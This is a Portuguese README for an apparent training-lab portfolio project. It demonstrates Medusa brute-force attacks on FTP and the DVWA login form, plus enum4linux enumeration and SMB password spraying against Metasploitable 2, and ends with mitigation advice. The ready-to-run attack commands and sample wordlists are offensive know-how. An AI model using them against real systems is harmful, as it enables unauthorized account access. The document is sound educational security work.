Objetivo do Projeto

Este projeto tem como objetivo demonstrar, de forma ética e controlada:

Ataques de força bruta em serviços como FTP, Web (DVWA) e SMB

Utilização da ferramenta Medusa para auditoria de segurança

Identificação de vulnerabilidades decorrentes de autenticação fraca

Boas práticas de mitigação

Documentação técnica clara e organizada

Uso do GitHub como portfólio profissional

Todo o processo foi executado em um ambiente isolado, para fins educacionais.

Arquitetura do Ambiente
Componente	Versão / SO	Função
Kali Linux	Rolling	Máquina atacante
Metasploitable 2	Linux vulnerável	Máquina alvo
DVWA	PHP/MySQL	Plataforma vulnerável para web exploitation
VirtualBox	7.x	Virtualização
Rede	Host-Only	Comunicação isolada das VMs
 Exemplo de endereços utilizados:
Kali Linux:        192.168.56.101
Metasploitable 2:  192.168.56.102

Ferramentas Utilizadas

Kali Linux
Medusa
Nmap
Enum4linux
DVWA
FTP Client
SMBClient
VirtualBox

Estrutura do Repositório
/wordlists            # listas de usuários e senhas personalizadas
README.md

Cenários Executados
Força Bruta em FTP com Medusa
Varredura inicial (Nmap)
nmap -sV 192.168.56.102


Resultado esperado: serviço FTP (21/tcp) aberto.

Ataque com Medusa

Testando usuário único:

medusa -h 192.168.56.102 -u msfadmin -P wordlists/passwords.txt -M ftp


Testando vários usuários:

medusa -h 192.168.56.102 -U wordlists/usernames.txt -P wordlists/passwords.txt -M ftp

Resultado esperado
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin

Ataque ao Formulário Web (DVWA) – http-form
Acessando DVWA

No navegador do Kali:

http://192.168.56.102/dvwa


No menu → DVWA Security → defina como Low.

Identificando o formulário

Inspecione campos e rota:

Método: POST

Campo usuário: username

Campo senha: password

Endpoint: /dvwa/vulnerabilities/brute/

Ataque com Medusa (http-form)
medusa -h 192.168.56.102 \
  -u admin \
  -P wordlists/passwords.txt \
  -M http-form \
  -m FORM:"/dvwa/vulnerabilities/brute/":username=^USER^&password=^PASS^&Login=Login \
  -m FAIL:"Username and/or password incorrect"

esultado esperado

Mensagem de sucesso indicando login válido.

Password Spraying + Enumeração em SMB
Enumeração de usuários – enum4linux
enum4linux -a 192.168.56.102


Usuários encontrados são adicionados à wordlist.

Password Spraying com Medusa
medusa -h 192.168.56.102 -U wordlists/usernames.txt -p msfadmin -M smbnt


Esse ataque tenta uma senha para vários usuários, evitando bloqueios de conta (conceito usado em redes reais).

Wordlists Utilizadas
/wordlists/usernames.txt
msfadmin
user
guest
service

/wordlists/passwords.txt
msfadmin
password
123456
admin
toor


As listas podem ser expandidas conforme o experimento.

Validação dos Acessos
FTP
ftp 192.168.56.102

SMB
smbclient -L 192.168.56.102 -U msfadmin

DVWA

Login via navegador após encontrar credenciais válidas.

Medidas de Mitigação
Para FTP / SMB

Aplicar política de senhas fortes

Bloqueio após tentativas falhas

Uso de MFA sempre que possível

Desabilitar serviços não utilizados

Utilizar protocolos mais modernos (SFTP/SSH)

Para Aplicações Web (DVWA)

Implementar CAPTCHA

Aplicar rate limiting

Respostas de erro genéricas

Monitorar logs

Utilizar WAF (Web Application Firewall)

Conclusões

Este projeto permitiu:

Compreender como funcionam ataques de força bruta em diferentes superfícies de ataque

Utilizar Medusa de forma prática em ambiente seguro

Analisar respostas dos serviços vulneráveis

Documentar processos técnicos conforme boas práticas

Reforçar conceitos de segurança defensiva
